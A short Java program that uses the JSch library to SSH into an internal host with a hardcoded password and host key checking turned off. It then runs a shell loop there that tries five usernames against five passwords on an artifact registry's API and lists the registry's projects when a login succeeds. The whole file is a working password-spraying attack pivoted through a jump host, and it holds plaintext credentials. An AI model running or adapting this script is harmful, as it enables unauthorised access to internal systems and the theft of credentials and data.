import com.jcraft.jsch.*;
import java.io.*;
class SSZ8 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("for u in herman seph admin ariel darwin; do for pw in kutul0nc4t canigonow atlassian bukanpassword hyperlink; do res=$(curl -sk -u $u:$pw -o /dev/null -w '%{http_code}' 'https://artifacts.internaltools.biz/api/v2.0/projects?page_size=50' 2>/dev/null); if [ \"$res\" = \"200\" ]; then echo \"SUCCESS $u:$pw\"; curl -sk -u $u:$pw 'https://artifacts.internaltools.biz/api/v2.0/projects?page_size=50' 2>/dev/null | python3 -c 'import sys,json;[print(p[\"name\"]) for p in json.load(sys.stdin)]' 2>&1; break 2; fi; done; done");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
